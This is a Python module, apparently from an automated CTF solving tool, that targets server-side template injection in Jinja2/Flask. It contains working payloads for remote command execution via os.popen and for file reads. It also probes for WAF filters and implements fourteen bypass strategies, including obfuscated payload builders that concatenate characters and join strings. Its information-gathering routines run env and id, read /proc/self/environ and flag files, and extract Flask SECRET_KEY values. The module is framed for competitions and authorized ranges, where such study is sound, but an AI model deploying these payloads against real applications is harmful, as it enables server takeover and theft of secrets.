"""
CTF 解题工具 — Jinja2 引擎模块
用途: 面向 CTF 竞赛的 Jinja2 SSTI 自动化解题辅助
场景: 竞赛平台题目 / 授权测试靶场

包含: 检测/指纹/RCE链/文件读取/WAF探测/14种绕过策略/信息收集
基于多场 DASCTF CTF2 实测验证
"""

import re
from .base import BaseEngine
from .utils import is_waf_blocked

# ============================================================
# 字符拼接法: 从 lipsum|string 和 dict() 中提取字符构建任意字符串
# ============================================================

LIPSUM_STR_PREFIX = '<function generate_lorem_ipsum at 0x'
LIPSUM_CHAR_INDEX = {}
for i, c in enumerate(LIPSUM_STR_PREFIX):
    if c not in LIPSUM_CHAR_INDEX:
        LIPSUM_CHAR_INDEX[c] = i


def _char_from_lipsum(idx):
    return f'(lipsum|string|list|batch({idx+1})|first)|last'


def _char_from_dict(c):
    return f'dict({c}=1)|list|first'


_CHR_REF_CACHE = None


def _get_chr_ref_expr():
    global _CHR_REF_CACHE
    if _CHR_REF_CACHE is not None:
        return _CHR_REF_CACHE
    globals_expr = build_jinja_str('__globals__')
    get_expr = build_jinja_str('get')
    builtins_expr = build_jinja_str('__builtins__')
    chr_expr = build_jinja_str('chr')
    if not all([globals_expr, get_expr, builtins_expr, chr_expr]):
        return None
    _CHR_REF_CACHE = (
        '((lipsum|attr(' + globals_expr + '))'
        '|attr(' + get_expr + ')(' + builtins_expr + '))'
        '|attr(' + get_expr + ')(' + chr_expr + ')'
    )
    return _CHR_REF_CACHE


def build_jinja_str(s):
    parts = []
    for c in s:
        if c in LIPSUM_CHAR_INDEX:
            parts.append(_char_from_lipsum(LIPSUM_CHAR_INDEX[c]))
        elif c == '_':
            parts.append(_char_from_lipsum(18))
        elif c == ' ':
            parts.append(_char_from_lipsum(9))
        else:
            if c.isalpha() or c == '_':
                parts.append(_char_from_dict(c))
            else:
                found = False
                for i, lc in enumerate(LIPSUM_STR_PREFIX):
                    if lc == c:
                        parts.append(_char_from_lipsum(i))
                        found = True
                        break
                if not found:
                    chr_ref = _get_chr_ref_expr()
                    if chr_ref:
                        parts.append('(' + chr_ref + ')(' + str(ord(c)) + ')')
                    else:
                        return None
    return '~'.join(parts)


def build_char_bypass_rce(cmd):
    globals_expr = build_jinja_str('__globals__')
    get_expr = build_jinja_str('get')
    os_expr = build_jinja_str('os')
    popen_expr = build_jinja_str('popen')
    read_expr = build_jinja_str('read')
    cmd_expr = build_jinja_str(cmd)
    if not all([globals_expr, get_expr, os_expr, popen_expr, read_expr, cmd_expr]):
        return None
    inner = (
        '((lipsum|attr(' + globals_expr + '))'
        '|attr(' + get_expr + ')(' + os_expr + '))'
        '|attr(' + popen_expr + ')(' + cmd_expr + ')'
    )
    return '{{((' + inner + ')|attr(' + read_expr + '))()}}'


# ============================================================
# |join 拼接法辅助函数
# ============================================================

def _split_word(word, filtered_words):
    for i in range(1, len(word)):
        p1, p2 = word[:i], word[i:]
        if not any(fw in p1 for fw in filtered_words) and \
           not any(fw in p2 for fw in filtered_words):
            return [p1, p2]
    for i in range(1, len(word)):
        for j in range(i + 1, len(word)):
            p1, p2, p3 = word[:i], word[i:j], word[j:]
            if all(not any(fw in p for fw in filtered_words)
                   for p in [p1, p2, p3]):
                return [p1, p2, p3]
    return None


def _split_around_filtered(s, filtered_words):
    if not any(fw in s for fw in filtered_words):
        return [s]
    best_pos = len(s)
    best_fw = None
    for fw in filtered_words:
        pos = s.find(fw)
        if pos != -1 and pos < best_pos:
            best_pos = pos
            best_fw = fw
    if best_fw is None:
        return [s]
    before = s[:best_pos]
    word = best_fw
    after = s[best_pos + len(word):]
    word_parts = _split_word(word, filtered_words)
    if word_parts is None:
        return None
    result = []
    if before:
        result.append(before)
    result.extend(word_parts)
    if after:
        result.extend(_split_around_filtered(after, filtered_words))
    return result


def build_join_expr(s, filtered_words):
    if not any(fw in s for fw in filtered_words):
        return "'" + s + "'"
    segments = _split_around_filtered(s, filtered_words)
    if segments is None:
        return None
    segments = [seg for seg in segments if seg]
    if not segments:
        return None
    if len(segments) == 1:
        return "'" + segments[0] + "'"
    parts = ','.join("'" + seg + "'" for seg in segments)
    return "[" + parts + "]|join"


def _apply_hex_escape(s, char, hex_seq):
    return s.replace(char, hex_seq)


def build_join_expr_hex(s, filtered_words, escaped_chars=None):
    if escaped_chars:
        for char, hex_seq in escaped_chars.items():
            s = _apply_hex_escape(s, char, hex_seq)
        remaining_filtered = set()
        for fw in filtered_words:
            if fw in s:
                remaining_filtered.add(fw)
        if remaining_filtered:
            segments = _split_around_filtered(s, remaining_filtered)
            if segments is None:
                return None
            segments = [seg for seg in segments if seg]
            if not segments:
                return None
            if len(segments) == 1:
                return "'" + segments[0] + "'"
            parts = ','.join("'" + seg + "'" for seg in segments)
            return "[" + parts + "]|join"
        else:
            return "'" + s + "'"
    else:
        return build_join_expr(s, filtered_words)


def build_join_bypass_rce(cmd, filtered_keywords, underscore_escaped=False, dot_available=True):
    escaped_chars = {'_': '\\x5f'} if underscore_escaped else None
    build_fn = build_join_expr_hex if underscore_escaped else build_join_expr
    exprs = {}
    for name, val in [('globals', '__globals__'),
                       ('builtins', '__builtins__'),
                       ('import', '__import__'),
                       ('os', 'os'),
                       ('popen', 'popen'),
                       ('cmd', cmd),
                       ('read', 'read')]:
        if underscore_escaped:
            expr = build_fn(val, filtered_keywords, escaped_chars)
        else:
            expr = build_join_expr(val, filtered_keywords)
        if expr is None:
            return None
        exprs[name] = expr
    read_suffix = '.read()' if dot_available else '[' + exprs['read'] + ']()'
    payload = (
        '{{lipsum[' + exprs['globals'] + '][' + exprs['builtins'] + ']'
        '[' + exprs['import'] + '](' + exprs['os'] + ')'
        '[' + exprs['popen'] + '](' + exprs['cmd'] + ')'
        + read_suffix + '}}'
    )
    return payload


def build_join_bypass_file_read(filepath, filtered_keywords, underscore_escaped=False, dot_available=True):
    escaped_chars = {'_': '\\x5f'} if underscore_escaped else None
    build_fn = build_join_expr_hex if underscore_escaped else build_join_expr
    exprs = {}
    for name, val in [('globals', '__globals__'),
                       ('builtins', '__builtins__'),
                       ('open', 'open'),
                       ('filepath', filepath),
                       ('read', 'read')]:
        if underscore_escaped:
            expr = build_fn(val, filtered_keywords, escaped_chars)
        else:
            expr = build_join_expr(val, filtered_keywords)
        if expr is None:
            return None
        exprs[name] = expr
    read_suffix = '.read()' if dot_available else '[' + exprs['read'] + ']()'
    payload = (
        '{{lipsum[' + exprs['globals'] + '][' + exprs['builtins'] + ']'
        '[' + exprs['open'] + '](' + exprs['filepath'] + ')'
        + read_suffix + '}}'
    )
    return payload


# ============================================================
# Jinja2 绕过策略
# ============================================================

BYPASS_STRATEGIES = [
    {
        'name': '无过滤（原始链）',
        'filters': set(),
        'rce': '{{lipsum.__globals__.os.popen("CMD").read()}}',
        'file_read': '{{lipsum.__globals__.__builtins__.open("FILEPATH").read()}}',
    },
    {
        'name': '过滤点号([]替代)',
        'filters': {'.'},
        'rce': "{{lipsum['__globals__']['os']['popen']('CMD')['read']()}}",
        'file_read': "{{lipsum['__globals__']['__builtins__']['open']('FILEPATH')['read']()}}",
    },
    {
        'name': '过滤下划线(|attr替代)',
        'filters': {'_'},
        'rce': "{{(lipsum|attr('__globals__')).os.popen('CMD').read()}}",
        'file_read': "{{(lipsum|attr('__globals__'))['__builtins__'].open('FILEPATH').read()}}",
    },
    {
        'name': '过滤点号+下划线(|attr+括号)',
        'filters': {'.', '_'},
        'rce': "{{(lipsum|attr('__globals__'))['os'].popen('CMD').read()}}",
        'file_read': "{{(lipsum|attr('__globals__'))['__builtins__']['open']('FILEPATH')['read']()}}",
    },
    {
        'name': '过滤点号+下划线+方括号(全attr链)',
        'filters': {'.', '_', '[]'},
        'rce': "((lipsum|attr('__globals__'))|attr('__getitem__')('os'))|attr('popen')('CMD')|attr('read')()",
        'file_read': None,
    },
    {
        'name': '过滤引号(request.args传参)',
        'filters': {"'", '"'},
        'rce': "{{(lipsum|attr(request.args.g)).os.popen(request.args.c).read()}}",
        'file_read': None,
        'extra_params': {'g': '__globals__', 'c': 'CMD', 'f': 'FILEPATH'},
    },
    {
        'name': '极端全过滤(attr+getitem+request.args)',
        'filters': {'.', '_', '[]', "'", '"'},
        'rce': "((lipsum|attr(request.args.a))|attr(request.args.b)(request.args.c))|attr(request.args.d)(request.args.e)|attr(request.args.f)()",
        'file_read': None,
        'extra_params': {
            'a': '__globals__', 'b': '__getitem__', 'c': 'os',
            'd': 'popen', 'e': 'CMD', 'f': 'read',
        },
    },
    {
        'name': '过滤关键字(request.args全传参)',
        'filters': {'keyword'},
        'rce': "{{(lipsum|attr(request.args.g))[request.args.o]|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}",
        'file_read': None,
        'extra_params': {
            'g': '__globals__', 'o': 'os', 'p': 'popen',
            'c': 'CMD', 'r': 'read',
        },
    },
    {
        'name': '过滤关键字+下划线(request.args传参)',
        'filters': {'keyword', '_'},
        'rce': "{{(lipsum|attr(request.args.g))[request.args.o]|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}",
        'file_read': None,
        'extra_params': {
            'g': '__globals__', 'o': 'os', 'p': 'popen',
            'c': 'CMD', 'r': 'read',
        },
    },
    {
        'name': '过滤关键字+下划线+点号(全request.args)',
        'filters': {'keyword', '_', '.'},
        'rce': "(lipsum|attr(request.args.g))|attr(request.args.i)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()",
        'file_read': None,
        'extra_params': {
            'g': '__globals__', 'i': '__getitem__', 'o': 'os',
            'p': 'popen', 'c': 'CMD', 'r': 'read',
        },
    },
    {
        'name': '字符拼接法(batch+dict+~+|attr)',
        'filters': {'space', '_', "'", '"', '[]', 'keyword', 'request', '.'},
        'rce': 'char_bypass',
        'file_read': None,
    },
    {
        'name': '|join拼接+[]getattr fallback',
        'filters': {'~', 'attr', 'keyword'},
        'rce': 'join_bypass',
        'file_read': 'join_bypass',
    },
    {
        'name': '|join拼接+Tab替代空格',
        'filters': {'~', 'attr', 'keyword', 'space'},
        'rce': 'join_bypass',
        'file_read': 'join_bypass',
    },
    {
        'name': '|join拼接+\\x5f转义+Tab替代空格',
        'filters': {'~', 'attr', 'keyword', 'space', '_'},
        'rce': 'join_bypass',
        'file_read': 'join_bypass',
    },
]


# ============================================================
# Jinja2 引擎类
# ============================================================

class Jinja2Engine(BaseEngine):
    """Jinja2 (Flask) SSTI 引擎 — 完整 WAF 探测 + 14 种绕过策略"""

    name = 'jinja2'
    template_tags = ('{{', '}}', '{%', '%}')
    error_keywords = [
        'TemplateSyntaxError', 'undefined', 'Internal Server Error',
        'TypeError', 'AttributeError', 'NameError', 'not defined',
        'Traceback', 'SyntaxError',
    ]

    detect_payloads = [
        {'payload': '{{7*7}}', 'expected': '49', 'engines': ['jinja2']},
        {'payload': "{{7*'7'}}", 'expected': '7777777', 'engines': ['jinja2']},
    ]

    fingerprints = [
        {"payload": "{{7*'7'}}", "expected": "7777777", "desc": "Jinja2 字符串乘法"},
        {"payload": "{{config}}", "expected": "Config", "desc": "Jinja2 config 对象"},
        {"payload": "{{''.__class__}}", "expected": "<class 'str'>", "desc": "Jinja2 对象链"},
    ]

    rce_chains = [
        '{{lipsum.__globals__.os.popen("CMD").read()}}',
        '{{cycler.__init__.__globals__.os.popen("CMD").read()}}',
        '{{joiner.__init__.__globals__.os.popen("CMD").read()}}',
        '{{namespace.__init__.__globals__.os.popen("CMD").read()}}',
        '{{get_flashed_messages.__globals__.__builtins__.__import__("os").popen("CMD").read()}}',
        '{{url_for.__globals__.__builtins__.__import__("os").popen("CMD").read()}}',
        '{{config.__class__.__init__.__globals__["os"].popen("CMD").read()}}',
        '{{request.application.__self__.__getattribute__("__builtins__").__import__("os").popen("CMD").read()}}',
        '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("CMD").read()}}',
    ]

    file_read_chains = [
        '{{lipsum.__globals__.__builtins__.open("FILEPATH").read()}}',
        '{{cycler.__init__.__globals__.__builtins__.open("FILEPATH").read()}}',
        '{{get_flashed_messages.__globals__.__builtins__.open("FILEPATH").read()}}',
    ]

    bypass_strategies = BYPASS_STRATEGIES

    def probe_waf(self, toolkit):
        """Jinja2 WAF 探测 — 完整字符级+关键字级"""
        filters = set()
        filtered_keywords = set()

        t_nospace = toolkit.send_and_clean('{{7*7}}')
        t_space = toolkit.send_and_clean('{{7 * 7}}')
        if '49' in t_nospace and '49' not in t_space:
            filters.add('space')

        t = toolkit.send_and_clean('{{7.0}}')
        if is_waf_blocked(t) or '7.0' not in t:
            t2 = toolkit.send_and_clean('{{lipsum.__doc__}}')
            if is_waf_blocked(t2) or not t2 or len(t2) < 3:
                filters.add('.')

        t = toolkit.send_and_clean('{{lipsum.__doc__}}')
        if is_waf_blocked(t) or not t or 'lipsum' not in t.lower() and len(t) < 3:
            t2 = toolkit.send_and_clean('{{lipsum.__name__}}')
            if is_waf_blocked(t2) or not t2 or len(t2) < 3:
                filters.add('_')

        t = toolkit.send_and_clean('{{[7][0]}}')
        if is_waf_blocked(t) or ('7' not in t or '49' in t):
            filters.add('[]')

        t = toolkit.send_and_clean("{{7*'7'}}")
        if is_waf_blocked(t) or '7777777' not in t:
            filters.add("'")

        t = toolkit.send_and_clean("{{7~7}}")
        if is_waf_blocked(t) or '77' not in t:
            filters.add('~')

        # 关键字探测
        test_cases = [
            ('attr', "{{lipsum|attr('__doc__')}}", 'lipsum'),
            ('class', "{{''.__class__}}", 'str'),
            ('mro', "{{''.__class__.__mro__}}", 'class'),
            ('subclasses', "{{''.__class__.__mro__[1].__subclasses__()}}", 'list'),
            ('init', "{{lipsum.__init__}}", 'function'),
            ('globals', "{{lipsum.__globals__}}", '__name__'),
            ('builtins', "{{lipsum.__globals__.__builtins__}}", 'builtins'),
            ('import', "{{lipsum.__globals__.__builtins__.__import__}}", 'builtin'),
            ('os', "{{lipsum.__globals__.os}}", 'module'),
            ('popen', "{{lipsum.__globals__.os.popen}}", 'builtin'),
            ('system', "{{lipsum.__globals__.os.system}}", 'builtin'),
            ('eval', "{{lipsum.__globals__.__builtins__.eval}}", 'builtin'),
            ('environ', "{{request.environ}}", 'HTTP'),
            ('config', '{{config}}', 'Config'),
            ('flag', '{{flag}}', ''),
            ('cat', "{{lipsum.__globals__.os.popen('cat')}}", ''),
        ]

        for kw, payload, expected_frag in test_cases:
            t = toolkit.send_and_clean(payload)
            if is_waf_blocked(t):
                filtered_keywords.add(kw)
                if kw == 'attr':
                    filters.add('attr')
                else:
                    filters.add('keyword')

        t = toolkit.send_and_clean('{{request}}')
        if is_waf_blocked(t):
            filters.add('request')
        else:
            t = toolkit.send_and_clean("{{request.args}}")
            if is_waf_blocked(t) or not t or '{{' in t or 'Internal Server Error' in t:
                filters.add('request')

        self.waf_filters = filters
        self.filtered_keywords = filtered_keywords
        return filters, filtered_keywords

    def build_rce_payload(self, cmd, toolkit=None):
        """Jinja2 RCE payload 构造 — 支持静态链 + 动态绕过"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None
        if strategy and strategy['rce'] == 'char_bypass':
            safe_cmd = self.sanitize_cmd_for_space(cmd, self.waf_filters)
            payload = build_char_bypass_rce(safe_cmd)
            return (payload, None) if payload else (None, None)

        if strategy and strategy['rce'] == 'join_bypass':
            safe_cmd = self.sanitize_cmd_for_space(cmd, self.waf_filters)
            ue = '_' in self.waf_filters
            da = '.' not in self.waf_filters
            payload = build_join_bypass_rce(safe_cmd, self.filtered_keywords,
                                            underscore_escaped=ue, dot_available=da)
            return (payload, None) if payload else (None, None)

        if strategy and isinstance(strategy['rce'], str) and 'CMD' in strategy['rce']:
            rce = strategy['rce'].replace('CMD', cmd)
            extra = strategy.get('extra_params')
            if extra:
                extra = {k: v.replace('CMD', cmd) if v == 'CMD' else v for k, v in extra.items()}
            return rce, extra

        # request.args 策略: rce 中无 CMD，但 extra_params 中有
        if strategy and isinstance(strategy['rce'], str) and strategy.get('extra_params'):
            extra = strategy['extra_params']
            extra = {k: v.replace('CMD', cmd) if v == 'CMD' else v for k, v in extra.items()}
            return strategy['rce'], extra

        # 默认: 用静态链
        for chain in self.rce_chains:
            return chain.replace('CMD', cmd), None
        return None, None

    def build_file_payload(self, filepath, toolkit=None):
        """Jinja2 文件读取 payload 构造"""
        strategy = getattr(toolkit, 'working_bypass', None) if toolkit else None
        if strategy and strategy.get('file_read') == 'join_bypass':
            ue = '_' in self.waf_filters
            da = '.' not in self.waf_filters
            payload = build_join_bypass_file_read(filepath, self.filtered_keywords,
                                                   underscore_escaped=ue, dot_available=da)
            return (payload, None) if payload else (None, None)

        if strategy and strategy.get('file_read') and 'FILEPATH' in str(strategy['file_read']):
            return strategy['file_read'].replace('FILEPATH', filepath), None

        for chain in self.file_read_chains:
            return chain.replace('FILEPATH', filepath), None
        return None, None

    def is_rce_output(self, text, cmd, toolkit=None):
        if not text or len(text) < 2:
            return False
        if is_waf_blocked(text):
            return False
        if '{{' in text or '{%' in text:
            return False
        for kw in self.error_keywords:
            if kw in text:
                return False
        if cmd == 'id':
            return 'uid=' in text or 'gid=' in text
        if toolkit:
            baseline = toolkit._get_baseline()
            if baseline and baseline == text.strip():
                return False
        if 'lipsum' in text or 'attr(' in text or 'request.args' in text:
            return False
        if '|join' in text and 'lipsum' in text:
            return False
        return len(text) > 0

    def info_gathering(self, toolkit):
        """Jinja2 信息收集"""
        print("\n" + "=" * 60)
        print("[*] 信息收集")
        print("=" * 60)

        if toolkit.working_chain:
            print("\n  [1] 系统信息 (通过 RCE):")
            if toolkit.working_chain == 'join_bypass':
                output = toolkit.exec_cmd('id')
                if output:
                    print(f"      {output[:300]}")
            else:
                output = toolkit.exec_cmd('id; echo "---"; uname -a 2>/dev/null; echo "---"; whoami')
                if output:
                    print(f"      {output[:300]}")

            print("\n  [2] 环境变量:")
            if toolkit.working_chain == 'join_bypass':
                output = toolkit.exec_cmd('env')
                if output and not is_waf_blocked(output) and 'Internal Server Error' not in output:
                    print(f"      {output[:500]}")
                else:
                    ue = '_' in self.waf_filters
                    da = '.' not in self.waf_filters
                    payload = build_join_bypass_file_read('/proc/self/environ', self.filtered_keywords,
                                                           underscore_escaped=ue, dot_available=da)
                    if payload:
                        text = toolkit.send_and_clean(payload)
                        if text and len(text) > 0 and '{{' not in text and not is_waf_blocked(text) and 'Internal Server Error' not in text:
                            output = toolkit._extract_output(text)
                            if output:
                                output = output.replace('\x00', '\n')
                                print(f"      {output[:500]}")
                        else:
                            print(f"      [-] 环境变量读取失败（environ 被过滤）")
            else:
                output = toolkit.exec_cmd('env')
                if output:
                    print(f"      {output[:500]}")

            print("\n  [3] 寻找 flag 文件:")
            if toolkit.working_chain == 'join_bypass':
                output = toolkit.exec_cmd('ls /')
                if output:
                    print(f"      根目录: {output[:500]}")
                ue = '_' in self.waf_filters
                da = '.' not in self.waf_filters
                for path in ['/flag', '/flag.txt', '/flag_in_h3r3_52daad']:
                    payload = build_join_bypass_file_read(path, self.filtered_keywords,
                                                           underscore_escaped=ue, dot_available=da)
                    if payload:
                        text = toolkit.send_and_clean(payload)
                        if text and len(text) > 0 and '{{' not in text and not is_waf_blocked(text) and 'Internal Server Error' not in text:
                            output = toolkit._extract_output(text)
                            if output and len(output) > 0 and 'Internal Server Error' not in output:
                                print(f"      [+] {path}: {output[:200]}")
                        elif text and 'Internal Server Error' in text:
                            print(f"      [-] {path}: 文件不存在或无法读取")
            else:
                output = toolkit.exec_cmd('ls /flag* /home/*/flag* /tmp/flag* 2>/dev/null; cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null')
                if output:
                    print(f"      {output}")

            print("\n  [4] Python 版本:")
            if toolkit.working_chain == 'join_bypass':
                ue = '_' in self.waf_filters
                da = '.' not in self.waf_filters
                payload = build_join_bypass_file_read('/proc/version', self.filtered_keywords,
                                                       underscore_escaped=ue, dot_available=da)
                if payload:
                    text = toolkit.send_and_clean(payload)
                    if text and len(text) > 0 and '{{' not in text and not is_waf_blocked(text):
                        output = toolkit._extract_output(text)
                        if output:
                            print(f"      {output[:200]}")
            else:
                output = toolkit.exec_cmd('python3 --version 2>/dev/null || python --version 2>/dev/null')
                if output:
                    print(f"      {output}")

            print("\n  [5] Flask config (直接注入):")
            text = toolkit.send_and_clean('{{config}}')
            if text and not is_waf_blocked(text):
                print(f"      {text[:500]}")
                secret = self._extract_secret(text)
                if secret:
                    print(f"      [!!!] SECRET_KEY / flag: {secret}")
            else:
                print(f"      [-] config 被 WAF 拦截")
                output = toolkit.exec_cmd('env | grep -i flag')
                if output:
                    print(f"      [+] 环境变量中的 flag: {output}")
        else:
            print("\n  [1] Flask config:")
            text = toolkit.send_and_clean('{{config}}')
            if text and not is_waf_blocked(text):
                print(f"      {text[:500]}")
                secret = self._extract_secret(text)
                if secret:
                    print(f"      [!!!] SECRET_KEY / flag: {secret}")
            else:
                print(f"      [-] config 不可读或被 WAF 拦截")

            print("\n  [2] config.items():")
            text = toolkit.send_and_clean('{{config.items()}}')
            if text and not is_waf_blocked(text):
                print(f"      {text[:500]}")

            print("\n  [3] __subclasses__ (前500字符):")
            text = toolkit.send_and_clean('{{().__class__.__bases__[0].__subclasses__()}}')
            if text and not is_waf_blocked(text):
                print(f"      {text[:500]}...")

            print("\n  [4] request.environ:")
            text = toolkit.send_and_clean('{{request.environ}}')
            if text and not is_waf_blocked(text):
                print(f"      {text[:300]}")

    @staticmethod
    def _extract_secret(text):
        if not text:
            return None
        match = re.search(r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)", text)
        if match:
            return match.group(1)
        match = re.search(r"flag\{[^}]+\}", text)
        if match:
            return match.group()
        return None

    def probe_attack_surface(self, toolkit):
        """Jinja2 攻击面探测"""
        print("\n  [1] config 泄漏检查:")
        text = toolkit.send_and_clean('{{config}}')
        if is_waf_blocked(text):
            print(f"      [-] config 被 WAF 拦截")
        elif text and 'Config' in text and 'SECRET' not in text:
            print(f"      [+] config 可读 (前200字符): {text[:200]}")
        elif text and len(text) > 5 and not is_waf_blocked(text):
            print(f"      [+] config 有输出 (前200字符): {text[:200]}")
        else:
            print(f"      [-] config 不可读")
        secret = self._extract_secret(text)
        if secret:
            print(f"      [!!!] SECRET_KEY / flag: {secret}")

        print("\n  [2] 全局对象可用性:")
        global_objs = [
            ('lipsum', '{{lipsum}}', '<function'),
            ('cycler', '{{cycler}}', '<class'),
            ('get_flashed_messages', '{{get_flashed_messages}}', '<function'),
            ('url_for', '{{url_for}}', '<function'),
            ('joiner', '{{joiner}}', '<class'),
            ('namespace', '{{namespace}}', '<class'),
            ('request', '{{request}}', '<Request'),
            ('config', '{{config}}', '<Config'),
            ('self', '{{self}}', '<TemplateReference'),
        ]
        available = []
        for name, payload, expected_fragment in global_objs:
            text = toolkit.send_and_clean(payload)
            if is_waf_blocked(text):
                print(f"      [-] {name}: 被 WAF 拦截")
                continue
            if text and len(text) > 0 and '{{' not in text and 'None' not in text[:10]:
                available.append(name)
                print(f"      [+] {name}: 可用 ({text[:60]})")
            else:
                print(f"      [-] {name}: 不可用或被过滤")
        print(f"\n  [*] 可用全局对象: {available}")
        return available
